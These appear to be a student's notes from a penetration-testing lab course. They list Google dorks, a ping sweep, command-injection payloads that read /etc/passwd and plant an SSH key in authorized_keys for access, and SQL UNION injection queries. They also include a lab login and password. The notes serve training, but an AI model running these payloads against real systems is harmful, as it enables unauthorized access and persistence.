GREYMAN
student@10.50.39.46 9MaGX5PmoRtsLKk
http://10.50.20.250:8000/challenges

linops
10.50.36.67

Phase
1: Mission Definitin
2: recon
3: footprinting
4: Exploit
5: post exp
6: Doc misssoin

exploit-db.com
virustotal


# google hacking
site: marines.mil
site: marines.mil covid 19
site: marines.mil filetype:pdf "covid 19"

 
# Recon 
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done

# Web Exploitation

-command injection
(home box)
  ssh-keygen -t rsa
  cat .ssh/id_rsa.pub
(Target)
  ; whoami
  ; cat /ect/passwd
  ; ls -la /var/www
  ; mkdir /var/www/.ssh
  ; echo "id_rsa.pub" > /var/www/.ssh/authorized_keys
  ; cat /var/www/.ssh/authorized_keys
(home)
  ssh www-data@10.50.31.75

  ls -la /var/www/html
  
# sql

mysql
show databases;
show tables from session;
select * from session.car;
use session;
select * from car;
describe car;
select * from car UNION select tireid,name,size,cost,1,2 FROM Tires;
  
